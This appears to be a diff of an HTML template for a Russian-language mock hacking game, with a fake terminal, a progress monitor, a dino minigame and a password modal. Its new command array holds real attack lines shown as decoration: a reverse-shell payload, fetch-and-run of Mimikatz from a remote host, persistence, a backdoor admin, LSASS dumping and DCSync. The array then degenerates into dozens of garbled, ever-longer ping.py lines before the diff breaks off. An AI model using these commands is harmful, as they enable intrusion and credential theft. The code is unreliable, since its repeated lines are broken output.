@@ -34,84 +34,125 @@
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 30px;
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 0 auto;
         }
         
+        .game-section {
+            grid-column: 1 / -1;
+            margin-top: 20px;
+        }
+        
         .terminal-section {
-            background: rgba(0, 0, 0, 0.8);
-            border: 1px solid #00ff95;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 0 20px rgba(0, 255, 149, 0.3);
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0,255,149,0.3);
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
         }
         
         .terminal-header {
+            background: #1a1a1a;
+            padding: 8px 12px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #00ff95;
+            border-bottom: 1px solid #333;
         }
+        
+        .terminal-buttons {
+            display: flex;
+            gap: 6px;
+        }
+        
+        .terminal-buttons span {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .btn-close { background: #ff5f56; }
+        .btn-minimize { background: #ffbd2e; }
+        .btn-maximize { background: #27ca3f; }
         
         .terminal-title {
             color: #00ff95;
-            font-size: 18px;
+            font-size: 12px;
             font-weight: bold;
         }
         
         .timer {
             color: #ff0000;
-            font-size: 24px;
+            font-size: 18px;
             font-weight: bold;
             font-family: 'Courier New', monospace;
         }
         
         .terminal-body {
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            line-height: 1.4;
+            padding: 12px;
+            background: #000;
+            min-height: 200px;
             max-height: 400px;
             overflow-y: auto;
+            scroll-behavior: smooth;
+        }
+        
+        .terminal-body .terminal-line:nth-child(n+21) {
+            display: none;
         }
         
         .terminal-line {
-            margin-bottom: 8px;
-            opacity: 0;
-            animation: fadeIn 0.5s ease-in forwards;
+            margin-bottom: 4px;
+            font-size: 14px;
+            line-height: 1.4;
+            opacity: 1;
+            transition: opacity 0.5s ease;
         }
         
-        .terminal-line:nth-child(1) { animation-delay: 0.1s; }
-        .terminal-line:nth-child(2) { animation-delay: 0.2s; }
-        .terminal-line:nth-child(3) { animation-delay: 0.3s; }
-        .terminal-line:nth-child(4) { animation-delay: 0.4s; }
-        .terminal-line:nth-child(5) { animation-delay: 0.5s; }
+        .terminal-line.hidden {
+            opacity: 0;
+            display: none;
+        }
         
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateX(-20px); }
-            to { opacity: 1; transform: translateX(0); }
+        .terminal-line.typing {
+            animation: typewriter 0.5s ease-in;
+        }
+        
+        @keyframes typewriter {
+            from { 
+                opacity: 0; 
+                transform: translateX(-10px);
+            }
+            to { 
+                opacity: 1; 
+                transform: translateX(0);
+            }
         }
         
         .prompt {
             color: #00ff95;
+            font-weight: bold;
         }
         
         .command {
-            color: #ffffff;
+            color: #fff;
         }
         
         .output {
-            color: #00ff95;
-            margin-left: 20px;
+            color: #ccc;
         }
         
         .output.success {
             color: #00ff95;
         }
         
+        .output.warn {
+            color: #ffbd2e;
+        }
+        
         .output.error {
-            color: #ff0000;
+            color: #ff5f56;
         }
         
         .output.warning {
@@ -122,30 +163,47 @@
             color: #0088ff;
         }
         
-        .progress-section {
-            background: rgba(0, 0, 0, 0.8);
-            border: 1px solid #00ff95;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 0 20px rgba(0, 255, 149, 0.3);
+        .password {
+            color: #00ff95;
+            font-weight: bold;
+            text-shadow: 0 0 8px rgba(0,255,149,0.5);
+            animation: passwordGlow 2s ease-in-out infinite;
         }
         
-        .progress-header {
+        .cursor {
+            animation: blink 1s infinite;
             color: #00ff95;
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            text-align: center;
         }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+        
+        @keyframes passwordGlow {
+            0%, 100% { text-shadow: 0 0 8px rgba(0,255,149,0.5); }
+            50% { text-shadow: 0 0 16px rgba(0,255,149,0.8); }
+        }
+        
+        .progress-section {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0,255,149,0.3);
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+        }
+        
+        
         
         .progress-bar {
             width: 100%;
-            height: 20px;
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid #00ff95;
-            border-radius: 10px;
+            height: 15px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 5px;
             overflow: hidden;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         
         .progress-fill {
@@ -158,22 +216,26 @@
         .progress-text {
             color: #00ff95;
             text-align: center;
-            font-size: 14px;
-            margin-bottom: 20px;
+            font-size: 12px;
+            margin-bottom: 15px;
+            font-family: 'Courier New', monospace;
         }
         
         .phase-list {
             list-style: none;
             padding: 0;
+            margin: 0;
         }
         
         .phase-item {
-            padding: 10px;
-            margin-bottom: 8px;
-            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 12px;
+            margin-bottom: 4px;
+            background: #1a1a1a;
             border-left: 3px solid #333;
             color: #666;
             transition: all 0.3s ease;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
         }
         
         .phase-item.active {
@@ -186,6 +248,88 @@
             border-left-color: #00ff95;
             color: #00ff95;
             background: rgba(0, 255, 149, 0.1);
+        }
+        
+        .game-section {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0,255,149,0.3);
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+        }
+        
+        .game-header {
+            background: #1a1a1a;
+            padding: 8px 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #333;
+        }
+        
+        .game-title {
+            color: #00ff95;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .game-score {
+            color: #00ff95;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .game-canvas {
+            width: 100%;
+            height: 200px;
+            background: #000;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hacker-dino {
+            position: absolute;
+            bottom: 0;
+            left: 20px;
+            width: 20px;
+            height: 20px;
+            background: #00ff95;
+            border-radius: 2px;
+            transition: transform 0.1s;
+        }
+        
+        .hacker-dino.jumping {
+            transform: translateY(-60px);
+        }
+        
+        .obstacle {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 15px;
+            height: 20px;
+            background: #ff0000;
+            border-radius: 2px;
+        }
+        
+        .game-over {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #ff0000;
+            font-size: 16px;
+            font-weight: bold;
+            text-align: center;
+            display: none;
+        }
+        
+        .game-instructions {
+            padding: 10px;
+            color: #00ff95;
+            font-size: 10px;
+            text-align: center;
         }
         
         .controls {
@@ -270,21 +414,75 @@
             box-shadow: none;
         }
         
+        /* Результат как модальный оверлей */
         .result-section {
-            grid-column: 1 / -1;
-            background: rgba(0, 0, 0, 0.8);
-            border: 1px solid #00ff95;
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 20px;
-            text-align: center;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.75);
             display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            padding: 20px;
         }
         
         .result-section.show {
-            display: block;
-            animation: fadeIn 0.5s ease-in;
+            display: flex;
+            animation: fadeIn 0.3s ease-in;
         }
+        
+        .result-card {
+            width: 100%;
+            max-width: 720px;
+            background: radial-gradient(1200px 300px at 50% -10%, rgba(0,255,149,0.05), transparent), #0a0a0a;
+            border: 1px solid rgba(0,255,149,0.3);
+            box-shadow: 0 0 30px rgba(0,255,149,0.2), inset 0 0 0 1px rgba(0,255,149,0.1);
+            border-radius: 12px;
+            padding: 28px;
+            color: #e5ffee;
+            text-align: center;
+            position: relative;
+        }
+        
+        .result-card::before {
+            content: '';
+            position: absolute;
+            inset: -1px;
+            border-radius: 12px;
+            padding: 1px;
+            background: linear-gradient(135deg, rgba(0,255,149,0.5), rgba(0,255,149,0) 40%, rgba(0,255,149,0.4));
+            -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+            -webkit-mask-composite: xor;
+                    mask-composite: exclude;
+            pointer-events: none;
+        }
+        
+        .result-title {
+            font-size: 24px;
+            color: #00ff95;
+            margin-bottom: 12px;
+            text-shadow: 0 0 20px rgba(0,255,149,0.35);
+        }
+        
+        .result-subtitle {
+            color: #88ffcc;
+            margin-bottom: 20px;
+        }
+        
+        .result-actions { margin-top: 22px; }
+        
+        .result-actions .btn {
+            background: linear-gradient(135deg, #00ff95, #00cc77);
+            color: #000;
+            padding: 12px 22px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            display: inline-block;
+            transition: transform .15s ease, box-shadow .15s ease;
+            box-shadow: 0 6px 20px rgba(0,255,149,0.25);
+        }
+        .result-actions .btn:hover { transform: translateY(-2px); }
         
         .encrypted-ip {
             color: #00ff95;
@@ -315,6 +513,12 @@
             box-shadow: 0 5px 15px rgba(0, 255, 149, 0.4);
         }
         
+        @media (max-width: 1200px) {
+            .main-hack-area {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+        
         @media (max-width: 768px) {
             .main-hack-area {
                 grid-template-columns: 1fr;
@@ -332,51 +536,81 @@
         <div class="main-hack-area">
             <div class="terminal-section">
                 <div class="terminal-header">
+                    <div class="terminal-buttons">
+                        <span class="btn-close"></span>
+                        <span class="btn-minimize"></span>
+                        <span class="btn-maximize"></span>
+                    </div>
                     <div class="terminal-title">TERMINAL v3.1.7</div>
                     <div class="timer" id="timer">20:00</div>
                 </div>
                 <div class="terminal-body" id="terminalBody">
-                    <div class="terminal-line">
+                    <div class="terminal-line" id="terminal-cursor">
                         <span class="prompt">root@hacker:~$</span>
-                        <span class="command">./init_attack.sh</span>
+                        <span class="cursor">_</span>
                     </div>
                 </div>
             </div>
             
         <div class="progress-section">
-            <div class="progress-header">Прогресс атаки</div>
+            <div class="terminal-header">
+                <div class="terminal-buttons">
+                    <span class="btn-close"></span>
+                    <span class="btn-minimize"></span>
+                    <span class="btn-maximize"></span>
+                </div>
+                <div class="terminal-title">PROGRESS MONITOR v2.0.1</div>
+            </div>
+            <div class="terminal-body">
             <div class="progress-bar">
                 <div class="progress-fill" id="progressFill" style="width: 0%"></div>
             </div>
             <div class="progress-text" id="progressText">0% - Готов к началу</div>
                 
                 <ul class="phase-list" id="phaseList">
-                    <li class="phase-item" data-phase="0">Сканирование портов...</li>
-                    <li class="phase-item" data-phase="1">Поиск уязвимостей...</li>
-                    <li class="phase-item" data-phase="2">Взлом системы...</li>
-                    <li class="phase-item" data-phase="3">Извлечение данных...</li>
-                    <li class="phase-item" data-phase="4">Шифрование IP адреса...</li>
+                    <!-- Фазы будут добавлены динамически через JavaScript -->
                 </ul>
             </div>
         </div>
         
-        <div class="controls">
-            <button class="btn-start" id="startBtn" onclick="startHack()">🚀 Начать атаку</button>
-            <button class="btn-complete" id="completeBtn" onclick="completeHack()" disabled>✅ Завершить</button>
-            <button class="btn-debug" id="debugBtn" onclick="speedUpTimer()" disabled>⚡ Ускорить таймер</button>
+        <div class="game-section">
+            <div class="game-header">
+                <div class="terminal-buttons">
+                    <span class="btn-close"></span>
+                    <span class="btn-minimize"></span>
+                    <span class="btn-maximize"></span>
+                </div>
+                <div class="game-title">HACKER GAME v1.0</div>
+                <div class="game-score" id="gameScore">Score: 0</div>
+            </div>
+            <div class="game-canvas" id="gameCanvas">
+                <div class="hacker-dino" id="hackerDino"></div>
+                <div class="game-over" id="gameOver">
+                    GAME OVER<br>
+                    <small>Press SPACE to restart</small>
+                </div>
+            </div>
+            <div class="game-instructions">
+                SPACE - Jump | ESC - Pause | R - Restart
+            </div>
+        </div>
         </div>
         
+        
+        
         <div class="result-section" id="resultSection">
-            <h3>🎉 Атака завершена!</h3>
-            <p>Найден зашифрованный IP адрес:</p>
+            <div class="result-card">
+                <div class="result-title">🎉 Атака завершена!</div>
+                <div class="result-subtitle">Найден зашифрованный IP адрес:</div>
             <div class="encrypted-ip" id="encryptedIp">XYZ.WVU.TS.RQP</div>
-            <div class="password-section" style="margin: 20px 0; padding: 15px; background: rgba(0, 255, 149, 0.1); border: 1px solid #00ff95; border-radius: 5px;">
-                <h4>🔐 Пароль для декодирования:</h4>
-                <div style="font-family: 'Courier New', monospace; font-size: 18px; color: #00ff95; font-weight: bold; margin: 10px 0;">HACK_COMPLETE</div>
-                <button onclick="copyPassword('HACK_COMPLETE')" style="background: #00ff95; color: #000; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-weight: bold;">Копировать пароль</button>
+                <div class="password-section" style="margin: 20px 0; padding: 15px; background: rgba(0, 255, 149, 0.06); border: 1px solid rgba(0,255,149,0.3); border-radius: 8px;">
+                    <h4 style="margin: 0 0 10px 0; color: #88ffcc;">🔐 Пароль для декодирования:</h4>
+                    <div style="font-family: 'Courier New', monospace; font-size: 20px; color: #00ff95; font-weight: bold; margin: 10px 0; text-shadow: 0 0 12px rgba(0,255,149,0.4);">HACK_COMPLETE</div>
+                    <button onclick="copyPassword('HACK_COMPLETE')" style="background: linear-gradient(135deg, #00ff95, #00cc77); color: #000; border: none; padding: 10px 18px; border-radius: 6px; cursor: pointer; font-weight: bold; box-shadow: 0 6px 20px rgba(0,255,149,0.25);">Копировать пароль</button>
             </div>
-            <div class="next-step">
-                <a href="{{ url_for('decode_ip') }}">Перейти к расшифровке IP</a>
+                <div class="result-actions">
+                    <a class="btn" href="{{ url_for('decode_ip') }}">Перейти к расшифровке IP</a>
+                </div>
             </div>
         </div>
     </div>
@@ -390,63 +624,203 @@
         let activityInterval;
         let currentPhase = 0;
         let speedMultiplier = 1; // Множитель скорости для отладки
+        let isTyping = false; // Идет ли сейчас набор команды
+        let isLocked = false; // Блокировка после 00:00
+        
+        // Игровые переменные
+        let gameRunning = false;
+        let gameScore = 0;
+        let gameSpeed = 1.5;
+        let obstacles = [];
+        let gameLoop;
         
         const phases = [
             'Сканирование портов...',
-            'Поип уязвимостей...',
+            'Поиск уязвимостей...',
             'Взлом системы...',
             'Извлечение данных...',
-            'Шифрование IP адреса...'
-        ];
-        
-        const activities = [
-            'Подключение к серверу...',
+            'Шифрование IP адреса...',
             'Анализ сетевого трафика...',
-            'Поиск открытых портов...',
-            'Сканирование уязвимостей...',
-            'Попытка взлома пароля...',
-            'Обход системы безопасности...',
-            'Извлечение конфиденциальных данных...',
-            'Анализ логов системы...',
-            'Поиск бэкдоров...',
-            'Установка трояна...',
-            'Кража учетных данных...',
-            'Мониторинг активности...',
-            'Сбор информации о сети...',
-            'Анализ протоколов...',
-            'Поиск слабых мест...',
-            'Взлом шифрования...',
-            'Извлечение файлов...',
+            'Установка бэкдоров...',
             'Скрытие следов...',
-            'Создание резервных копий...',
             'Подготовка к финальной атаке...'
         ];
+        
+        const hackCommands = [
+            'nmap -sS -O 192.168.1.0/24',
+            'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100',
+            'sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs',
+            'metasploit > use exploit/windows/smb/ms17_010_eternalblue',
+            'john --wordlist=/usr/share/wordlists/passwords.txt hash.txt',
+            'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap',
+            'burpsuite --proxy 127.0.0.1:8080',
+            'wireshark -i eth0 -f "tcp port 80"',
+            'nikto -h http://target.com',
+            'dirb http://target.com /usr/share/wordlists/dirb/common.txt',
+            'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt',
+            'enum4linux -a 192.168.1.100',
+            'smbclient -L //192.168.1.100 -N',
+            'rdesktop 192.168.1.100:3389',
+            'ssh -o StrictHostKeyChecking=no admin@192.168.1.100',
+            'telnet 192.168.1.100 23',
+            'nc -lvp 4444',
+            'python3 -c "import socket; s=socket.socket(); s.connect(("192.168.1.100", 4444))"',
+            'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > payload.exe',
+            'powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.50/Invoke-Mimikatz.ps1")"',
+            'certutil -urlcache -split -f http://192.168.1.50/payload.exe C:\\temp\\payload.exe',
+            'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "C:\\temp\\payload.exe"',
+            'net user hacker P@ssw0rd123 /add',
+            'net localgroup administrators hacker /add',
+            'wmic process call create "C:\\temp\\payload.exe"',
+            'schtasks /create /tn "SystemUpdate" /tr "C:\\temp\\payload.exe" /sc onlogon',
+            'copy C:\\temp\\payload.exe \\\\192.168.1.100\\C$\\temp\\',
+            'psexec \\\\192.168.1.100 -u admin -p password C:\\temp\\payload.exe',
+            'mimikatz.exe "sekurlsa::logonpasswords" "exit"',
+            'procdump.exe -accepteula -ma lsass.exe lsass.dmp',
+            'secretsdump.py -hashes :ntlmhash admin@192.168.1.100',
+            'crackmapexec smb 192.168.1.100 -u admin -p password --lsa',
+            'bloodhound-python -d domain.local -u admin -p password -gc dc.domain.local -c all',
+            'kerberoast.py -request -dc-ip 192.168.1.100 domain.local/admin',
+            'golden_ticket.py -kdc 192.168.1.100 -spn cifs/server.domain.local -user admin -domain domain.local -sid S-1-5-21-1234567890-1234567890-1234567890',
+            'dcsync.py domain.local/admin:password@192.168.1.100 -target-dc 192.168.1.100 -just-dc-user krbtgt',
+            'ntlmrelayx.py -tf targets.txt -smb2support',
+            'responder.py -I eth0 -rdw',
+            'impacket-ntlmrelayx -tf targets.txt -smb2support',
+            'smbclient.py domain.local/admin:password@192.168.1.100',
+            'wmiexec.py domain.local/admin:password@192.168.1.100',
+            'psexec.py domain.local/admin:password@192.168.1.100',
+            'atexec.py domain.local/admin:password@192.168.1.100 "whoami"',
+            'smbexec.py domain.local/admin:password@192.168.1.100',
+            'dcomexec.py domain.local/admin:password@192.168.1.100',
+            'lookupsid.py domain.local/admin:password@192.168.1.100',
+            'rpcdump.py domain.local/admin:password@192.168.1.100',
+            'samrdump.py domain.local/admin:password@192.168.1.100',
+            'netview.py domain.local/admin:password@192.168.1.100',
+            'reg.py domain.local/admin:password@192.168.1.100 query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
+            'services.py domain.local/admin:password@192.168.1.100',
+            'wkssvc.py domain.local/admin:password@192.168.1.100',
+            'tsclient.py domain.local/admin:password@192.168.1.100',
+            'rpcmap.py domain.local/admin:password@192.168.1.100',
+            'rpcdump.py domain.local/admin:password@192.168.1.100 -port 135',
+            'ifmap.py domain.local/admin:password@192.168.1.100',
+            'ping.py domain.local/admin:password@192.168.1.100',
+            'ping6.py domain.local/admin:password@192.168.1.100',
+            'ping.py -6 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N -O domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N -O -P domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N -O -P -Q domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N -O -P -Q -R domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N -O -P -Q -R -S domain.local/admin:password@192.168.1.100',
